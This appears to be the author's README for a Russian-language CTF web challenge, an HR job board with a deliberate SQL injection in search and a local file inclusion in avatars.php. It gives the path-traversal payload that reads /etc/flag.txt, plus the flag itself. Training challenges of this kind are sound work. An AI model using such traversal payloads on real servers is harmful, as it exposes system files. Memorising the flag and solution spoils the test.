# HRBoard

Доска объявлений для HR. На главной странице поисковая строка - логика поиска содержит SQL-мнъекцию, которая должна находиться с пол тычка
В самой базе данных ничего нет

Уязвимость можно обнаружить при изучении того, как отображаются анкеты:
```
<div class="card-body">
    <h5 class="card-title">
        David Brown
    </h5>
    
    <p class="card-text">
        Job Description: DevOps Engineer - Collaborate with development and operations teams to implement CI/CD pipelines, automate processes, and improve system reliability.
    </p>

    <img src="/avatars.php?avatar=4.png&return_image=true" style="width:200px; height:200px;">
    
    <p class="card-text">
        Salary waiting: 787 $
    </p>
    
</div>
```

Есть скрипт avatars.php, отвечающий за рендеринг автатарок из объявлений. Он подвержен LFI по URI
```
/avatars.php?avatar=../../../../../etc/flag.txt&return_image=true
```

Чтобы LFI эксплуатировалась менее очевидно - обязателен параметр return_image (о его наличии можно догадаться при изучении кода страницы)


### Flag
```
tqlCTF{y0u_must_f1nd_4ll_vulns_f0r_3v3ry_4ppl1c4t10n}
```

### Deploy

```
docker-compose up
```

Доступ к таску через порт 8080